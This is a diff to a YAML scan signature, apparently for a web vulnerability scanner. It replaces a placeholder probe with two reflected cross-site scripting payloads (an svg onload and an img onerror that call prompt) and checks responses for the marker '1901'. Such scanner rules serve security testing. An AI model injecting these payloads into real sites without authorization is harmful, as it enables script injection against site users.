@@ -7,14 +7,14 @@ info:
 
 # origin: gonna come from Burp
 payloads:
-    - abc<xsshere>abc
-    
+    - </script><svg/onload=(prompt)(1901)>
+    - <img src=1 onerror=(prompt)(1901)>    
 requests:
   - redirect: true
-  - generators:
+    generators:
       # Change exist content type or adding new one
       - Query("[[.original]]{{.payload}}")
       - Path("[[.original]]{{.payload}}", "*")
     detections:
       - >-
-        StatusCode() != 301 && StatusCode() != 302 && StringSearch("response", "<xsshere>")
+        StatusCode() != 301 && StatusCode() != 302 && StringSearch("response", "1901")
